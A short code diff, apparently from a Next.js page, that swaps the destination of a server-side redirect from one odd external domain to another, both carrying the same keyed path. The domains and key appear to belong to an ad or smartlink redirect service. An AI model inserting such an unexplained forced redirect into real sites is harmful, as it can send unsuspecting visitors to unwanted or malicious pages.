@@ -19,7 +19,7 @@ export const getServerSideProps: GetServerSideProps = async (ctx) => {
 			redirect: {
 				permanent: false,
 				destination: `${
-					`https://groinenamel.com/ti73m5kj5s?key=e165769c62bbf49f62b99d863111ec8a`
+					`https://signingunwilling.com/ti73m5kj5s?key=e165769c62bbf49f62b99d863111ec8a`
 				}`,
 			},
 		};
